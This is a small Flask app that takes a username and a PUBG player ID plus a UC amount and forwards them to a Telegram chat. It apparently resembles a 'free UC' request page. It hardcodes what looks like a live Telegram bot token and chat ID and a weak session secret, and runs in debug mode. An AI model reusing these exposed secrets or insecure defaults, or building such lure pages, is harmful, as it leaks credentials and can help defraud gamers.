from flask import Flask, request, render_template, redirect, session
import requests

app = Flask(__name__)
app.secret_key = "game_secret_key"

# 🔴 ضع بيانات البوت هنا
BOT_TOKEN = "8073621434:AAH-Bm7fVfkl-1VeGZGE_oyBLGr2tSCNnhE"
CHAT_ID = "703015262"


def send_to_telegram(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": text
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print("Error:", e)


@app.route("/")
def login():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def do_login():
    username = request.form.get("username")
    session["user"] = username
    return redirect("/home")


@app.route("/home")
def home():
    if "user" not in session:
        return redirect("/")
    return render_template("home.html")


@app.route("/send", methods=["POST"])
def send_uc():

    if "user" not in session:
        return redirect("/")

    pubg_id = request.form.get("pubg_id")
    uc = request.form.get("uc")

    text = f"""
🎮 PUBG REQUEST

👤 User: {session['user']}
🆔 PUBG ID: {pubg_id}
💰 UC: {uc}

⚡ Status: Pending Review
"""

    send_to_telegram(text)

    return render_template("done.html")


if __name__ == "__main__":
    app.run(debug=True)